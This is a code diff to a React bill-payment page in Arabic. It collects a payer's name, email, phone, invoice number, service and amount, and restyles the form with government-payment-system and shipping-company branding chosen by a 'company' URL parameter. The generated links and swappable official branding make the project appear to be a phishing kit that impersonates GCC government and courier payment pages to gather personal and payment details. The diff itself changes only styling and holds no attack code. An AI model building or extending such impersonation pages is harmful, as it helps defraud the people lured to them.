@@ -1,6 +1,5 @@
 import { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Helmet } from "react-helmet-async";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -11,9 +10,12 @@ import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
+import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Building2 } from "lucide-react";
 import BrandedTopBar from "@/components/BrandedTopBar";
+import BrandedCarousel from "@/components/BrandedCarousel";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { getServiceBranding } from "@/lib/serviceLogos";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 
 const PaymentData = () => {
   const { id } = useParams();
@@ -28,15 +30,15 @@ const PaymentData = () => {
   const [selectedService, setSelectedService] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("");
 
-  // Get query parameters from URL
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';
 
   const serviceName = "دفع فاتورة";
   const paymentInfo = linkData?.payload as any;
   
-  // Get government payment system for branding
   const govSystem = getGovernmentPaymentSystem(paymentInfo?.selectedCountry || "SA");
+  const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
 
   // Get country from link data
   const countryCode = paymentInfo?.selectedCountry || "SA";
@@ -124,44 +126,65 @@ const PaymentData = () => {
         title="دفع فاتورة - إكمال البيانات"
         description="قم بإكمال بيانات السداد لدفع الفاتورة"
       />
-      {/* Branded Top Bar */}
+      
       <BrandedTopBar 
         serviceKey={serviceKey}
         serviceName={govSystem.nameAr || serviceName}
         showBackButton={true}
         countryCode={countryCode}
-        showCarousel={true}
+        showCarousel={false}
       />
 
+      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
+
       <div 
-        className="min-h-screen" 
+        className="min-h-screen py-6 sm:py-8" 
         dir="rtl"
         style={{
-          background: govSystem.colors.background,
-          fontFamily: govSystem.fonts.primaryAr
+          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
+          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
         }}
       >
-        <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
+        <div className="container mx-auto px-3 sm:px-4">
           <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+            <Card 
+              className="p-4 sm:p-8 shadow-2xl border-t-4" 
+              style={{ 
+                borderTopColor: branding.colors.primary,
+                boxShadow: companyBranding?.shadows.xl || '0 20px 60px -15px rgba(0, 0, 0, 0.3)',
+                borderRadius: companyBranding?.borderRadius.lg || '16px'
+              }}
+            >
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">إكمال بيانات السداد</h1>
+                  <h1 
+                    className="text-xl sm:text-3xl font-bold" 
+                    style={{ 
+                      color: companyBranding?.colors.text || govSystem.colors.text,
+                      fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                    }}
+                  >
+                    إكمال بيانات السداد
+                  </h1>
 
                   <div
                     className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                     style={{
-                      background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
+                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                      boxShadow: companyBranding?.shadows.lg || '0 10px 40px -10px rgba(0,0,0,0.3)'
                     }}
                   >
-                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                   </div>
                 </div>
 
                 <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-                  {/* Customer Name */}
                   <div>
-                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                    <Label 
+                      htmlFor="name" 
+                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
                       <User className="w-3 h-3 sm:w-4 sm:h-4" />
                       الاسم الكامل *
                     </Label>
@@ -170,14 +193,21 @@ const PaymentData = () => {
                       value={customerName}
                       onChange={(e) => setCustomerName(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                       placeholder="أدخل اسمك الكامل"
+                      style={{
+                        borderColor: companyBranding?.colors.border || '#e5e7eb',
+                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                      }}
                     />
                   </div>
 
-                  {/* Customer Email */}
                   <div>
-                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                    <Label 
+                      htmlFor="email" 
+                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
                       <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                       البريد الإلكتروني *
                     </Label>
@@ -187,14 +217,21 @@ const PaymentData = () => {
                       value={customerEmail}
                       onChange={(e) => setCustomerEmail(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                       placeholder="example@email.com"
+                      style={{
+                        borderColor: companyBranding?.colors.border || '#e5e7eb',
+                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                      }}
                     />
                   </div>
 
-                  {/* Customer Phone */}
                   <div>
-                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                    <Label 
+                      htmlFor="phone" 
+                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
                       <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                       رقم الهاتف *
                     </Label>
@@ -204,14 +241,21 @@ const PaymentData = () => {
                       value={customerPhone}
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                       placeholder={`${phoneCode} ${phonePlaceholder}`}
+                      style={{
+                        borderColor: companyBranding?.colors.border || '#e5e7eb',
+                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                      }}
                     />
                   </div>
 
-                  {/* Invoice Number */}
                   <div>
-                    <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                    <Label 
+                      htmlFor="invoice" 
+                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
                       <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
                       الرقم المفوتر *
                     </Label>
@@ -220,16 +264,30 @@ const PaymentData = () => {
                       value={invoiceNumber}
                       onChange={(e) => setInvoiceNumber(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                       placeholder="مثال: INV-12345"
+                      style={{
+                        borderColor: companyBranding?.colors.border || '#e5e7eb',
+                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                      }}
                     />
                   </div>
 
-                  {/* Government Service Selection */}
                   <div>
-                    <Label className="mb-2 text-sm">الخدمة الحكومية/العامة *</Label>
+                    <Label 
+                      className="mb-2 text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
+                      الخدمة الحكومية/العامة *
+                    </Label>
                     <Select value={selectedService} onValueChange={setSelectedService}>
-                      <SelectTrigger className="h-10">
+                      <SelectTrigger 
+                        className="h-10 sm:h-12 border-2 focus:border-primary transition-all"
+                        style={{
+                          borderColor: companyBranding?.colors.border || '#e5e7eb',
+                          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                        }}
+                      >
                         <SelectValue placeholder="اختر الخدمة" />
                       </SelectTrigger>
                       <SelectContent className="bg-background z-50">
@@ -247,9 +305,12 @@ const PaymentData = () => {
                     )}
                   </div>
 
-                  {/* Payment Amount */}
                   <div>
-                    <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                    <Label 
+                      htmlFor="amount" 
+                      className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
                       <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
                       مبلغ السداد *
                     </Label>
@@ -259,10 +320,14 @@ const PaymentData = () => {
                       value={paymentAmount}
                       onChange={(e) => setPaymentAmount(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:border-primary transition-all"
                       placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                       step="0.01"
                       min="0"
+                      style={{
+                        borderColor: companyBranding?.colors.border || '#e5e7eb',
+                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                      }}
                     />
                     <p className="text-xs text-muted-foreground mt-1">
                       المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
@@ -273,9 +338,11 @@ const PaymentData = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-2xl hover:shadow-3xl transition-all duration-300"
                   style={{
-                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                    boxShadow: companyBranding?.shadows.xl || `0 20px 60px -15px ${branding.colors.primary}90`,
+                    fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                   }}
                   disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                 >
